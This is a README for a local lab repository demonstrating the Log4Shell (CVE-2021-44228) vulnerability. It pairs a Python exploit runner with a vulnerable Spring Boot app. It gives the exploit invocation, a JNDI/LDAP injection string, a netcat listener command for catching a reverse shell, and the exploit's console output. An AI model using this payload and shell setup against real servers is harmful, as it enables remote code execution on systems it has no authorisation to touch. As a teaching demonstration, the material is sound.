# log4shell-poc

Proof-of-Concept for the CVE-2021-44228 vulnerability.

This repository contains an example Spring Boot application and a proof-of-concept exploit for the widely used log4j Java logging library.

## Attacker

### Requirements

Create a [virtual environment](https://docs.python.org/3/tutorial/venv.html) (optional but recommended).

Install the required Python packages using [pip](https://pip.pypa.io/en/stable/):

```bash
pip install -r requirements.txt
```

### Usage

Execute the exploit using the following command:

```bash
python poc.py --userip localhost --webport 8000 --lport 9001
```

```
$ python poc.py --userip localhost --webport 8000 --lport 9001
[!] CVE: CVE-2021-44228

[+] Generating Payload...
[+] Using payload for Windows
[+] Successfully created payload

[+] Starting LDAP server

[+] Starting web server http://0.0.0.0:8000

[+] Send me: ${jndi:ldap://localhost:1389/a}

Listening on 0.0.0.0:1389
```

### Exploit Details

This script sets up both HTTP and LDAP servers and generates a payload for the vulnerable parameter. The payload varies based on the operating system, providing additional examples of this exploit.

- **On Windows**: It launches the calculator application.
- **On Linux**: It establishes a reverse shell connection.

<br>

To listen for the connection, use [netcat](https://docs.oracle.com/cd/E86824_01/html/E54763/netcat-1.html) with the following command:

```bash
nc -lvnp 9001
```

## Victim

### Usage

Run the Spring Boot application:

```bash
./mvnw spring-boot:run
```

```
  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::                (v2.6.1)

...

2024-05-10 18:44:03.951  INFO 17200 --- [main] o.s.b.w.e.t.TomcatWebServer  : Tomcat started on port(s): 8080 (http) with context path ''
2024-05-10 18:44:03.959  INFO 17200 --- [main] c.e.d.Application            : Started Application in 1.657 seconds (JVM running for 2.233)
```

Access the web application by going to:

```
http://localhost:8080/
```

## Credits

This project is based on the proof-of-concept by [kozmer](https://github.com/kozmer/log4j-shell-poc).

## Disclaimer

The purpose of this project is to help people learn about this vulnerability.
